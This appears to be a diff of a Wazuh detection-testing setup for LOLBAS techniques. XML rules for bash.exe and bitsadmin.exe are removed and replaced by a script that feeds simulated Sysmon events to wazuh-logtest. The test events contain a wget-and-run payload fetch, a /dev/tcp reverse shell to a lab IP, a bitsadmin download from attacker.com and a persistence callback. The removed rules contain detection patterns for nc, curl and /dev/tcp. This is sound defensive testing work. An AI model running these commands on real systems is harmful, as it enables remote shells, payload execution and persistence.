-    <description>LOLBAS [T1202] bash.exe (WSL legacy) process creation - deprecated since Windows 1709; any execution may be suspicious</description>
-    <group>T1202,lolbas_bash,</group>
-    <mitre>
-      <id>T1202</id>
-    </mitre>
-  </rule>
+echo ""
+echo "================================================================="
+echo "6. Bash.exe — T1202 | Rule 100330 (level 3)"
+echo "   PoC: bash.exe execution (baseline)"
+echo "   Command: bash.exe -c 'calc.exe'"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\bash.exe","commandLine":"bash.exe -c calc.exe","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"bash.exe","integrityLevel":"Medium","processId":"4411","parentProcessId":"5678","utcTime":"2026-04-13 07:25:00.000"}}}' | /var/ossec/bin/wazuh-logtest
 
-  <rule id="100331" level="12">
-    <if_sid>100330</if_sid>
-    <field name="win.eventdata.commandLine" type="pcre2">(?i)\bbash(\.exe)?\s+-c\s+</field>
-    <description>LOLBAS [T1202] Suspicious: bash.exe -c flag used - command executed indirectly via deprecated WSL bash binary</description>
-    <group>T1202,lolbas_bash,</group>
-    <mitre>
-      <id>T1202</id>
-    </mitre>
-  </rule>
+echo ""
+echo "================================================================="
+echo "6b. Bash.exe — T1202 | Rule 100331 (level 12)"
+echo "    PoC: bash.exe -c flag (indirect command execution)"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\bash.exe","commandLine":"bash.exe -c wget http://192.168.1.100/payload.sh -O /tmp/p.sh && bash /tmp/p.sh","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"bash.exe","integrityLevel":"Medium","processId":"4412","parentProcessId":"5678","utcTime":"2026-04-13 07:25:05.000"}}}' | /var/ossec/bin/wazuh-logtest
 
-  <rule id="100332" level="13">
-    <if_sid>100330</if_sid>
-    <field name="win.eventdata.commandLine" type="pcre2">(?i)(/dev/tcp|tcp-connect|\bnc\b|\bncat\b|curl\s|wget\s|/C\s|&gt;.*\.exe|python.*socket|bash.*&amp;)</field>
-    <description>LOLBAS [T1202] High: bash.exe command line contains network or shell escape patterns - potential reverse shell or data exfiltration</description>
-    <group>T1202,lolbas_bash,</group>
-    <mitre>
-      <id>T1202</id>
-    </mitre>
-  </rule>
-
-  <rule id="100333" level="13">
-    <if_sid>61603</if_sid>
-    <field name="win.eventdata.parentImage" type="pcre2">(?i)\\bash\.exe$</field>
-    <field name="win.eventdata.image" type="pcre2">(?i)\\(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|net\.exe|net1|schtasks|certutil)\.exe$</field>
-    <description>LOLBAS [T1202] High: bash.exe (WSL) spawned Windows shell/LOLBin - indirect command execution bridging WSL and Win32 environments</description>
-    <group>T1202,lolbas_bash,</group>
-    <mitre>
-      <id>T1202</id>
-      <id>T1059</id>
-    </mitre>
-  </rule>
-
-  <rule id="100334" level="13">
-    <if_sid>61605</if_sid>
-    <field name="win.eventdata.image" type="pcre2">(?i)\\bash\.exe$</field>
-    <description>LOLBAS [T1202] High: bash.exe (WSL legacy) initiated network connection - unexpected for deprecated binary; investigate for C2/exfiltration</description>
-    <group>T1202,lolbas_bash,</group>
-    <mitre>
-      <id>T1202</id>
-    </mitre>
-  </rule>
+echo ""
+echo "================================================================="
+echo "6c. Bash.exe — T1202 | Rule 100332 (level 13)"
+echo "    PoC: bash.exe with /dev/tcp (reverse shell pattern)"
+echo "    Command: bash.exe -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\bash.exe","commandLine":"bash.exe -c \"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\"","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"bash.exe","integrityLevel":"Medium","processId":"4413","parentProcessId":"5678","utcTime":"2026-04-13 07:25:10.000"}}}' | /var/ossec/bin/wazuh-logtest
 
 
-  <rule id="100400" level="12">
-    <if_sid>61603</if_sid>
-    <field name="win.eventdata.image" type="pcre2">(?i)\\bitsadmin\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">(?i)(/transfer\s|/addfile\s).*https?://</field>
-    <description>LOLBAS [T1197/T1105] Suspicious: bitsadmin.exe /transfer or /addfile with HTTP(S) URL - active BITS download to victim machine</description>
-    <group>T1197,T1105,lolbas_bitsadmin,</group>
-    <mitre>
-      <id>T1197</id>
-      <id>T1105</id>
-    </mitre>
-  </rule>
+echo ""
+echo "================================================================="
+echo "7. Bitsadmin.exe — T1197/T1105 | Rule 100404 (level 8)"
+echo "   PoC Step 1: Create BITS job"
+echo "   Command: bitsadmin /create MyJob"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\bitsadmin.exe","commandLine":"bitsadmin /create MyJob","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"bitsadmin.exe","integrityLevel":"High","processId":"6600","parentProcessId":"5678","utcTime":"2026-04-13 07:30:00.000"}}}' | /var/ossec/bin/wazuh-logtest
 
-  <rule id="100401" level="12">
-    <if_sid>60103</if_sid>
-    <field name="win.system.eventID">^4688$</field>
-    <field name="win.eventdata.newProcessName" type="pcre2">(?i)\\bitsadmin\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">(?i)(/transfer\s|/addfile\s).*https?://</field>
-    <description>LOLBAS [T1197/T1105] Suspicious: bitsadmin.exe /transfer or /addfile with HTTP(S) URL via Security 4688 - BITS download</description>
-    <group>T1197,T1105,lolbas_bitsadmin,</group>
-    <mitre>
-      <id>T1197</id>
-      <id>T1105</id>
-    </mitre>
-  </rule>
+echo ""
+echo "================================================================="
+echo "7b. Bitsadmin.exe — T1197/T1105 | Rule 100400 (level 12)"
+echo "    PoC Step 2: Add file download URL"
+echo "    Command: bitsadmin /addfile MyJob https://attacker.com/payload.exe C:\\temp\\payload.exe"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\bitsadmin.exe","commandLine":"bitsadmin /addfile MyJob https://attacker.com/payload.exe C:\\temp\\payload.exe","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"bitsadmin.exe","integrityLevel":"High","processId":"6601","parentProcessId":"5678","utcTime":"2026-04-13 07:30:05.000"}}}' | /var/ossec/bin/wazuh-logtest
 
-  <rule id="100402" level="14">
-    <if_sid>61603</if_sid>
-    <field name="win.eventdata.image" type="pcre2">(?i)\\bitsadmin\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">(?i)/setnotifycmdline\s</field>
-    <description>LOLBAS [T1197] High: bitsadmin.exe /setnotifycmdline - registering notify callback for BITS job completion (persistence mechanism)</description>
-    <group>T1197,lolbas_bitsadmin,</group>
-    <mitre>
-      <id>T1197</id>
-      <id>T1546</id>
-    </mitre>
-  </rule>
+echo ""
+echo "================================================================="
+echo "7c. Bitsadmin.exe — T1197 | Rule 100402 (level 14)"
+echo "    PoC Step 3: Set persistence notify command"
+echo "    Command: bitsadmin /setnotifycmdline MyJob C:\\temp\\payload.exe NULL"
+echo "    (Atomic Red Team T1197 Test #3)"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\bitsadmin.exe","commandLine":"bitsadmin /setnotifycmdline MyJob C:\\temp\\payload.exe NULL","parentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","parentCommandLine":"powershell.exe -ExecutionPolicy Bypass -Command Invoke-AtomicTest T1197 -TestNumbers 3","user":"WIN-LAB01\\hieun","originalFileName":"bitsadmin.exe","integrityLevel":"High","processId":"6602","parentProcessId":"6580","utcTime":"2026-04-13 07:30:10.000"}}}' | /var/ossec/bin/wazuh-logtest
 
-  <rule id="100403" level="14">
-    <if_sid>60103</if_sid>
-    <field name="win.system.eventID">^4688$</field>
-    <field name="win.eventdata.newProcessName" type="pcre2">(?i)\\bitsadmin\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">(?i)/setnotifycmdline\s</field>
-    <description>LOLBAS [T1197] High: bitsadmin.exe /setnotifycmdline via Security 4688 - BITS persistence callback registered</description>
-    <group>T1197,lolbas_bitsadmin,</group>
-    <mitre>
-      <id>T1197</id>
-      <id>T1546</id>
-    </mitre>
-  </rule>
-
-  <rule id="100404" level="8">
-    <if_sid>61603</if_sid>
-    <field name="win.eventdata.image" type="pcre2">(?i)\\bitsadmin\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">(?i)/create\s</field>
-    <description>LOLBAS [T1197] Low: bitsadmin.exe /create - new BITS transfer job created; monitor subsequent /addfile or /setnotifycmdline calls</description>
-    <group>T1197,lolbas_bitsadmin,</group>
-    <mitre>
-      <id>T1197</id>
-    </mitre>
-  </rule>
-
-  <rule id="100405" level="8">
-    <if_sid>60103</if_sid>
-    <field name="win.system.eventID">^4688$</field>
-    <field name="win.eventdata.newProcessName" type="pcre2">(?i)\\bitsadmin\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">(?i)/create\s</field>
-    <description>LOLBAS [T1197] Low: bitsadmin.exe /create via Security 4688 - new BITS transfer job created</description>
-    <group>T1197,lolbas_bitsadmin,</group>
-    <mitre>
-      <id>T1197</id>
-    </mitre>
-  </rule>
-
-</group>
+echo ""
+echo "================================================================="
+echo "ALL TESTS COMPLETE"
+echo "================================================================="
